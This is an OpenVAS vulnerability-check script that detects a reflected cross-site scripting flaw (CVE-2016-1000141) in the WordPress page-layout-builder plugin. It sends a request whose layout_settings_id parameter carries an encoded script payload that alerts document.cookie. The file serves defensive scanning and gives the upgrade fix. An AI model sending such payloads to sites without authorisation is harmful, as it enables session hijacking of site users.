###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_page_layout_builder_plugin_xss_vuln.nasl 11938 2018-10-17 10:08:39Z asteins $
#
# Wordpress Page Layout Builder Plugin Reflected Cross Site Scripting Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809081");
  script_version("$Revision: 11938 $");
  script_cve_id("CVE-2016-1000141");
  script_bugtraq_id(93804);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-17 12:08:39 +0200 (Wed, 17 Oct 2018) $");
  script_tag(name:"creation_date", value:"2016-10-25 11:30:49 +0530 (Tue, 25 Oct 2016)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Wordpress Page Layout Builder Plugin Reflected Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with wordpress
  page-layout-builder plugin and is prone to reflected cross site scripting
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to execute arbitrary script or not.");

  script_tag(name:"insight", value:"The flaw is due to an insufficient
  sanitization of user supplied input via variable 'layout_settings_id'
  to file '/page-layout-builder/includes/layout-settings.php'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to create a specially crafted request that would execute arbitrary
  script code in a user's browser session within the trust relationship between
  their browser and the server.");

  script_tag(name:"affected", value:"Wordpress plugin page-layout-builder version
  1.9.3.");

  script_tag(name:"solution", value:"Upgrade to version 2.0.0. or higher.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.vapidlabs.com/wp/wp_advisory.php?v=358");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/page-layout-builder");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + '/wp-content/plugins/page-layout-builder/includes/layout-settings.php?' +
            'layout_settings_id=%22%3E%3Cscript%3Ealert(document.cookie);%3C/script%3E%3C%22';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
  pattern:"<script>alert\(document.cookie\);</script>",
  extra_check:"/page-layout-builder/includes/layout-settings.php"))
{
  report = report_vuln_url(port:http_port, url:url);
  security_message(port:http_port, data:report);
  exit(0);
}
